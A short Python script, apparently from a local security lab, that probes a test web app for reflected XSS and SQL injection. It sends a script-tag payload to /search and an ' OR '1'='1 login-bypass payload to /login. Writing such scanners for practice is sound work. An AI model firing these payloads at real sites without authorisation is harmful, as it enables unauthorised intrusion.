import requests

TARGET_URL = "http://127.0.0.1:5000"

def check_xss():
    print("[*] Testing for Reflected XSS...")
    # Пейлоад: пытаемся вставить скрипт, который выведет алерт
    payload = "<script>alert('XSS')</script>"
    test_url = f"{TARGET_URL}/search?name={payload}"
    
    response = requests.get(test_url)
    
    # Если наш скрипт вернулся в коде страницы без изменений — сайт уязвим
    if payload in response.text:
        print("[!] CRITICAL: XSS Vulnerability detected in /search?name=")
    else:
        print("[-] No XSS detected.")

def check_sql_injection():
    print("\n[*] Testing for SQL Injection...")
    # Пейлоад: классический обход авторизации ' OR '1'='1
    payload = "' OR '1'='1"
    data = {'username': payload, 'password': 'any'}
    
    response = requests.post(f"{TARGET_URL}/login", data=data)
    
    # Если в ответе есть секретное слово (FLAG или Welcome), значит мы обошли вход
    if "Welcome back" in response.text or "FLAG" in response.text:
        print("[!] CRITICAL: SQL Injection detected in /login (username field)")
    else:
        print("[-] No SQL Injection detected.")

if __name__ == "__main__":
    print("--- Simple Vulnerability Scanner ---")
    try:
        # Проверяем, запущен ли сайт
        requests.get(TARGET_URL)
        check_xss()
        check_sql_injection()
    except requests.exceptions.ConnectionError:
        print("[!] Error: Target website is not running! Run app.py first.")
